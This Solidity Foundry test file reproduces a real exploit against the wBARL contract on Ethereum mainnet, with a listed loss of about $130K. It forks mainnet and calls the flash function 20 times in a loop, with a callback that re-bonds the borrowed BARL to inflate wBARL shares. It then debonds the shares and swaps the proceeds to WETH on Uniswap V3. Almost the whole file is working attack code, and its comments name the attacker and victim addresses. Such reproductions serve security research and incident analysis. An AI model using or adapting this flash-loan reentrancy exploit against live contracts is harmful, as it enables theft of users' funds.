// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$130K
// Attacker : https://etherscan.io/address/0x7b3a6eff1c9925e509c2b01a389238c1fcc462b6
// Attack Contracts : https://etherscan.io/address/0x356e7481b957be0165d6751a49b4b7194aef18d5
// Vuln Contract : https://etherscan.io/address/0x04c80bb477890f3021f03b068238836ee20aa0b8
// Attack Tx : https://phalcon.blocksec.com/explorer/tx/eth/0x995e880635f4a7462a420a58527023f946710167ea4c6c093d7d193062a33b01

// @Analysis
// https://phalcon.blocksec.com/explorer/security-incidents
// https://www.bitget.com/news/detail/12560603890246
// https://twitter.com/Phalcon_xyz/status/1751788389139992824

interface IwBARL is IERC20 {
    function flash(
        address _recipient,
        address _token,
        uint256 _amount,
        bytes memory _data
    ) external;

    function bond(address _token, uint256 _amount) external;

    function debond(uint256 _amount, address[] memory, uint8[] memory) external;
}

interface IUniswapV3Router {
    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }

    function exactInput(
        ExactInputParams memory params
    ) external payable returns (uint256 amountOut);
}

contract ContractTest is Test {
    IERC20 private constant DAI =
        IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant BARL =
        IERC20(0x3e2324342bF5B8A1Dca42915f0489497203d640E);
    IERC20 private constant WETH =
        IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IwBARL private constant wBARL =
        IwBARL(0x04c80Bb477890F3021F03B068238836Ee20aA0b8);
    IUniswapV3Router private constant Router =
        IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    function setUp() public {
        vm.createSelectFork("mainnet", 19106654);
        vm.label(address(DAI), "DAI");
        vm.label(address(BARL), "BARL");
        vm.label(address(WETH), "WETH");
        vm.label(address(wBARL), "wBARL");
        vm.label(address(Router), "Router");
    }

    function testExploit() public {
        // Start with 200 DAI tokens transferred from exploiter to attack contract in txs:
        // https://phalcon.blocksec.com/explorer/tx/eth/0xa685928b5102349a5cc50527fec2e03cb136c233505471bdd4363d0ab077a69a
        // https://phalcon.blocksec.com/explorer/tx/eth/0xaaa197c7478063eb1124c8d8b03016fe080e6ec4c4f4a4e6d7f09022084e3390
        // DAI tokens will be used by wBARL flash function
        deal(address(DAI), address(this), 200e18);

        emit log_named_decimal_uint(
            "Exploiter WETH balance before attack",
            WETH.balanceOf(address(this)),
            WETH.decimals()
        );

        uint8 i;
        while (i < 20) {
            DAI.approve(address(wBARL), 10e18);
            wBARL.flash(
                address(this),
                address(BARL),
                BARL.balanceOf(address(wBARL)),
                ""
            );
            ++i;
        }

        address[] memory token = new address[](1);
        token[0] = address(BARL);
        uint8[] memory percentage = new uint8[](1);
        percentage[0] = 100;
        wBARL.debond(wBARL.balanceOf(address(this)), token, percentage);

        BARLToWETH();
        emit log_named_decimal_uint(
            "Exploiter WETH balance after attack",
            WETH.balanceOf(address(this)),
            WETH.decimals()
        );
    }

    function callback(bytes calldata data) external {
        BARL.approve(address(wBARL), BARL.balanceOf(address(this)));
        wBARL.bond(address(BARL), BARL.balanceOf(address(this)));
    }

    function BARLToWETH() internal {
        BARL.approve(address(Router), type(uint256).max);
        bytes memory _path = abi.encodePacked(
            address(BARL),
            hex"002710",
            address(DAI),
            hex"0001f4",
            address(WETH)
        );
        IUniswapV3Router.ExactInputParams memory params = IUniswapV3Router
            .ExactInputParams({
                path: _path,
                recipient: address(this),
                deadline: block.timestamp + 1000,
                amountIn: BARL.balanceOf(address(this)),
                amountOutMinimum: 0
            });
        Router.exactInput(params);
    }
}
